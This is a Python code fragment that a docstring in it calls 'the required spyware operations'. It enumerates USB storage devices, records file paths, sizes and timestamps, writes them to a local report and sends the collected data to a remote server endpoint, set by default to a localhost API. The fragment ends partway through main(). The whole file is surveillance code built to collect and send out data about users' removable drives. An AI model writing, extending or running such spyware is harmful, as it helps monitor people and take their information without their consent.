def run_single_scan(output_file, remote_server):
    """Run a single scan of USB devices."""
    try:
        # Create output directory if it doesn't exist
        output_dir = './target'
        os.makedirs(output_dir, exist_ok=True)

        devices = get_usb_storage_devices()

        with open(output_file, 'w') as f:
            f.write("USB Storage Device File Metadata Report\n")
            f.write("=" * 50 + "\n\n")

            if not devices:
                f.write("No USB storage devices found.\n")
                logger.info("No USB storage devices found.")
                return

            f.write(f"Found {len(devices)} USB storage device(s):\n\n")
            logger.info(f"Found {len(devices)} USB storage device(s)")

            all_data = {
                'devices': [],
                'timestamp': datetime.now().isoformat()
            }

            for i, device in enumerate(devices, 1):
                f.write(f"Device {i}: {device}\n")
                logger.info(f"Scanning device {device}")

                files = get_device_files(device)

                device_info = {
                    'device': device,
                    'files': files
                }

                all_data['devices'].append(device_info)

                if files:
                    f.write(f"  Files ({len(files)} found):\n")
                    for file_info in files:
                        f.write(f"    Path: {file_info['path']}\n")
                        f.write(f"    Size: {file_info['size']} bytes\n")
                        f.write(f"    Created: {file_info['created']}\n")
                        f.write(f"    Modified: {file_info['modified']}\n")
                        f.write("\n")
                else:
                    f.write("  No files found or access denied.\n\n")
                    logger.info(f"No files found on device {device}")

            f.write("\nReport generated on: " + datetime.now().isoformat() + "\n")

        # Send data to server if configured
        try:
            send_result, response = send_to_server(all_data, remote_server)
            if send_result:
                logger.info(f"Data successfully sent to server (Status: {response})")
            else:
                logger.warning(f"Failed to send data to server: {response}")
        except Exception as e:
            logger.error(f"Error during server communication: {e}")

    except Exception as e:
        logger.error(f"Error during USB scan: {e}")

def main():
    """Main function implementing the required spyware operations."""
    # Set default values for parameters
    output_file = './target/output_file.txt'
    remote_server = 'http://localhost:8080/api/usb-data'

